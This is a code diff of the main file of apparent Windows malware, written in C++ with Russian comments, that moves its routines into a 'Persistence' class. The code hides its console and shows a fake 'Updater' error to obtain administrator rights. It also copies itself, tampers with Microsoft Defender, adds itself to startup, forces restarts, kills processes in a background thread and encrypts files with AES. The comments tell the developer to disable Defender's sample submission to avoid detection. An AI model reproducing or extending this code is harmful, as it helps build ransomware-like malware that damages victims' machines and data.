@@ -1,48 +1,40 @@
-#include "pers/func.h"
+#include "pers/pers.h"
 #include "pers/include.h"
-#include "pers/threads.h"
-
 #include "encrypt/cryptor.h"
 
 using namespace std;
-// g++ main.cpp -static -static-libgcc -static-libstdc++ -lgdi32 -o my_program.exe
-
-// main execution of code parts depends on location and other conditions on the infected device
-// 3213
 // !!ВАЖНО!!
-// ЕСЛИ У ТЕБЯ WINDOWS
-// КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ НА ТВОЕМ ПК И НА ВИРТУАЛКЕ
+// КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ
 // ЧТОБЫ ОТКЛЮЧИТЬ ОТПРАВКУ: Защита от вирусов и угроз - параметры защиты от вирусов и других угроз - управление настройками - автоотправка образцов отключить
 int main(int argc, char* argv[]) {
+    Persistence Persistence;
     HWND Console;
     Console = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(Console, 0);
     char path[MAX_PATH];
-    if (!isUserAdmin()) {
-        // MessageBox(NULL, "Please run as administrator to complete the installation! Error: 0x00000A9", "Updater", MB_ICONERROR | MB_OK);;
-        restartAsAdmin();
+    if (!Persistence::isUserAdmin()) {
+        MessageBox(NULL, "Please run as administrator to complete the installation! Error: 0x00000A9", "Updater", MB_ICONERROR | MB_OK);;
+        Persistence::restartAsAdmin();
         return 0;
     }
     Sleep(rand() % 5000 + 5000);
-    if (copyAndRunSelf()) {
+    if (Persistence::copyAndRunSelf()) {
         return 0;
     }
-    if (!checkAndCreateFile("lafkildatnn.dat")) {
-        DefenderOwner();
-        //CopyFileToSysWow64("C:\\Windows\\SysWOW64\\adskisatana666.exe", "test.exe");
-        addToStartup();
+    if (!Persistence::checkAndCreateFile("lafkildatnn.dat")) {
+        Persistence::DefenderOwner();
+        Persistence::addToStartup();
         Sleep(1500);
-        reset();
+        Persistence::reset();
         Sleep(rand() % 5000 + 5000);
-        restartSystem();
+        Persistence::restartSystem();
         return 0;
     }
-    std::thread killerThread(StopAllShit); // Запускаем фоновый поток
+    std::thread killerThread(Persistence::StopExe); // Запускаем фоновый поток
     killerThread.detach();
     Sleep(2000);
-    // ShellExecute(NULL, "runas", "C:\\Windows\\SysWOW64\\adskisatana666.exe", NULL, NULL, SW_SHOWNORMAL);
     // тут основной процесс закрепления 
-    std::string filename = "C:\\Windows\\SysWOW64\\" + getDiskSerial() + ".txt";
+    std::string hwid = "C:\\Windows\\SysWOW64\\" + Persistence::getDiskSerial() + ".txt";
 
 
     // { ENCRYPTION } //
@@ -77,8 +69,8 @@ int main(int argc, char* argv[]) {
             AES.decryptFile(filename);
     }
 
-    cleanfile();
-    cleanreg();
-    reset();
+    Persistence::cleanfile();
+    Persistence::cleanreg();
+    Persistence::reset();
     return 0;
 }
